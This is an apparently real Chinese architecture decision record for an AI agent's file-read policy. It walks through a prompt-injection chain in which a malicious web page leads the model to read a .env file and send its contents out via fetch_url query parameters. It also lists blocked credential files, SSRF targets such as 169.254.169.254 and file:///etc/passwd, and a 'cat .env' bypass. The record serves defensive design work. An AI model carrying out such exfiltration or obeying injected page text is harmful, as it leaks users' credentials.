# ADR-0006：workspace 边界对「读」放开，代价是三条护栏

> 状态：ACCEPTED
> 日期：2026-08-28
> 对应决策点：阶段 3 实施方案 决 3（含修订 2）
> 影响的架构条款：V05 §14（Policy）、§22.1（Grant Scope）、§22.4（不可信内容）、§22.7（数据最小化）
> 证据来源：`verify:tools` F 段、`verify:artifact` D 段、`verify:scenarios` 护栏总校验

## Problem

阶段 1–2 的 Policy 对越界一律拒绝，不分读写：

```ts
if (effect.riskFacts.includes("OUTSIDE_WORKSPACE")) return DENY;
```

这在只有 `list_dir` 的时候没有代价。阶段 3 一加 `read_file` / `search` 就有了：
**办公场景要读的文档、代码场景要读的仓库，天然不在 `.workagent-workspace/` 下面。**
边界不动的话，Agent 的射程被锁死在一个空目录里 —— 那不是安全，是不可用。

所以要决：**读能不能越界？**

## Hypothesis

原始论证是一句看起来很干净的不对称性：

> 读错文件是**信息问题**，写错文件是**不可逆损失**。

做决策时的认知状态：相信这条不对称性成立，因此读可以放开而写必须保留。

**当时没想到的**：这条论证有一个前提 —— Agent 没有对外发送数据的能力。
而同一批要加的工具里就有 `fetch_url`。

## Alternatives

| 方案 | 优点 | 代价 | 何时会后悔 |
|---|---|---|---|
| A. 读写都保留边界 | 最安全；零新增机制 | Agent 射程锁死在空目录里，办公与代码场景都做不了 | 第一次想让它读一份仓库外的文档时 |
| B. 读放开，不加任何护栏 | 最简单 | **外泄链路畅通**（见下） | 第一次有人往 Agent 面前贴一个恶意网页时 |
| C. 接 Capability 三层校验，逐次授权读 | 最正规 | 本阶段不接授权层（决 3）；而且逐次授权读会让「读一批文档」变成十几次询问 | —— |
| **D. 读放开 ＋ 三条最小护栏** | 射程打开；残余风险明确且在 Trace 上可审计 | 三条护栏都要真的在场，少一条整个决定就不成立 | 三条护栏中任何一条被删或被加白名单时 |

## Decision

**workspace 边界对「写」保留 DENY，对「读」放开；代价是三条护栏必须同时在场。**

### 为什么原论证在 `fetch_url` 之后失效

```text
读是信息问题 ⇒ 信息可以被外发 ⇒ 读 ＋ 外发 ＝ 损失
```

具体链路（逐段核过源码）：

```text
workspace 外读放开
  → read_file / search 读到仓库根 .env（含真实端点凭证与 baseUrl）
  → 内容进入上下文（SimpleRedaction 只打 sk- 形状与 Bearer，其余配置漏网）
  → 外部网页正文注入，诱导模型调用 fetch_url("https://…/?d=<内容>")
  → GET 的 query 参数就是外发通道
```

**这条链路不需要创建任何授权**，所以 §22.4【定】「不可信内容不能创建 Grant /
改变 Policy / 自动批准 Action」拦不住它 —— 那条不变量管的是授权，而这里根本没有授权发生。

### 三条护栏

1. **读黑名单** —— `.env*` / `.git/` / `.workagent-state/` / `.ssh` / `.aws` / `.npmrc` / `.netrc` 等。
   **【定】必须同时覆盖 `read_file` 与 `search`**：`search(kind:"content")` 一次能扫遍
   整棵目录树，比 `read_file` 更高效地构成同一条链路 —— **只挡 `read_file` 等于没挡**。
   `search` 里它在**遍历时**就生效（`kind:"name"` 同样会把 `.env` 这个文件名报出去，
   而「仓库根有个 .env」本身就是线索），并如实回报 `skippedByReadGuard` 计数
   —— 悄悄跳过等于给模型一个「这里什么都没有」的假象。
   **`stat` 不在管辖范围**：判据是「会不会把**内容**带进上下文」，不是「名字里有没有 secret」。
2. **`fetch_url` 拒绝私网与 localhost**（防 SSRF）。**必须在 DNS 解析之后判**
   —— 只判 hostname 字符串的话，一个 A 记录指向 127.0.0.1 的公开域名直接过关，
   而这类域名现成就有。**重定向终点要再判一次**：`https://example.com/r` 可以 302 到
   `http://127.0.0.1:8080/…`，`redirect: "follow"` 会老老实实跟过去。
3. **URL scope 产出 riskFact ＋ `dataMovement`**。`EffectScope.kind` 从阶段 1 起就有
   `"URL"`，但 `effect-resolver.ts` **只对 FILE / DIRECTORY 判过风险** ——
   URL scope 拿不到任何 riskFact，于是一次把内容当 query 发出去的 GET，
   在 Policy 眼里和一次本地读文件长得一模一样。
   （评审把这条记成「scopeKind 枚举缺 URL」，**那不准**：缺的不是枚举，是判定。
   所以护栏很便宜。）
   **`dataMovement.destination` 只记 host，`scope` 只记参数名不记参数值** ——
   否则这条审计记录自己会变成第二个泄漏点。

## Consequences

### 接受的代价

- **残余风险真实存在。** 决 3 之下审批全部放行，所以这三条 fact **当前不阻断任何东西**，
  它们的价值是让「这次调用把数据发去了哪里」在 Trace 上**可审计**。
  单人本地开发期接受这个残余风险；**但不接受「发生了也查不出来」**。
- **黑名单是枚举，不是原理。** 它挡得住已知的凭证文件形态，挡不住用户自己
  放在 workspace 外的敏感文档。这是有意的取舍：一个「什么都不让读」的黑名单
  会退化成方案 A。
- **`verify:tools` F 段必须同时测正反两向** —— 只测「拒绝」的话，
  一个永远拒绝的闸门也能全绿。

### 适用条件

- 单人本地开发期；
- 没有登录态、没有 Cookie、没有 `run_command`；
- 审批默认放行（决 3 的另一半）。

**【定】三条护栏中少任何一条，读放开就该被改回一律拒绝。**
这句话写进了 `policy.ts` 那段代码的注释里，就在放行判定的正上方。

### 重新评估的触发条件

- 引入登录态抓取、Cookie、或任何携带凭证的网络工具
  —— 那时 D-19（Workspace × Endpoint 数据边界矩阵）的触发条件成立；
- 引入 `run_command` —— 它能绕过读黑名单（`cat .env`）；
- 接上 Capability 授权层 —— 那时应当重新考虑把边界收回，改由授权表达；
- 任何一条护栏被加白名单或被删。

## Eval Evidence

- `verify:tools` **F 段**：workspace 内放一个含 canary 值的 `.env`。
  `read_file(".env")` 被拒（`TOOL_READ_DENIED`）；`search(pattern:"CANARY", kind:"content")`
  命中数 0 且报告 `skippedByReadGuard: 1`；**反向**：同目录的 `normal.txt` 仍然读得到
  —— 黑名单不是「一律拒绝」。canary 值全程没有进过上下文。
- `verify:artifact` **D 段**：`127.0.0.1`（真实可连的本机服务器）、`localhost`、
  `169.254.169.254`（云元数据服务）、`file:///etc/passwd` 四条全部被拒；
  URL scope 的 effect 如实标成 `NETWORK` 而不是 `READ`；
  带 query 的外发产出三条 riskFact（`EXTERNAL_ENDPOINT` / `URL_CARRIES_QUERY` /
  `DATA_LEAVES_HOST`），`dataMovement` 记下 host 与参数名，
  **断言参数值没有被抄进审计记录**。
- `verify:scenarios` 末段：三条护栏的**在场性**总校验。

## Interview Narrative

阶段 3 要让 Agent 能读 workspace 外的文档 —— 不然办公和代码场景都做不了。
放开的论证一开始很干净：读错文件是信息问题，写错文件是不可逆损失。

但同一批我们还加了 `fetch_url`，而它让这条论证塌了：读是信息问题，
信息可以被外发，读加外发就是损失。完整链路是「读到 .env → 内容进上下文 →
外部网页正文诱导模型把它当 query 参数发出去」，全程**不需要创建任何授权**，
所以我们原有的「不可信内容不能创建 Grant」那条不变量根本管不着。

所以放开是有代价的，代价是三条护栏：读黑名单（**必须同时覆盖 read_file 和 search**，
因为一次内容搜索能扫遍整棵树，只挡前者等于没挡）、私网拒绝（要在 DNS 解析之后判，
而且重定向终点要再判一次），以及给 URL scope 补上风险事实与数据流向记录 ——
最后这条不阻断任何东西，它的作用是让外发在 Trace 上查得到。
我们在 Policy 那段代码的正上方写了一句：三条里少任何一条，这里就该改回一律拒绝。
